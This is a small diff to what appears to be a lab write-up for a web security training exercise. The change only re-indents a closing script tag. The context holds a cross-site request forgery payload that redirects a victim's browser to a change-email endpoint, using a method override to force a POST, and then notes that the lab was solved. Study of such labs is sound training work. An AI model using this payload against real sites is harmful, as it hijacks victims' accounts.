@@ -27,6 +27,6 @@
   ```
   <script>
     document.location = "https://0af8006e04f3292381706bfc00a00015.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
-</script>
+  </script>
   ```
   - and we solved the lab
